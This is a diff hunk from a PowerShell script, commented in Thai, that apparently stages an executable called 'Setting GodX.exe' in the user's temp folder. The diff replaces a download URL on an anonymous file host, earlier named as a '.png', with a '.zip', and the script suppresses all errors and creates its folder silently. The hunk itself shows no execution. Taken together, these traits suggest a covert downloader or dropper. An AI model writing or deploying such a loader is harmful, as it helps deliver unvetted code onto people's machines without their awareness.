@@ -4,7 +4,7 @@ $ErrorActionPreference = 'SilentlyContinue'
 $exeName = "Setting GodX.exe"
 $tempPath = "$env:TEMP\GodX_App"
 $exePath = "$tempPath\$exeName"
-$url = "https://files.catbox.moe/c7lpiz.png"
+$url = "https://files.catbox.moe/afb9rh.zip"
 
 # 1. สร้างโฟลเดอร์แบบเงียบ
 if (!(Test-Path $tempPath)) { New-Item -ItemType Directory -Path $tempPath -Force | Out-Null }
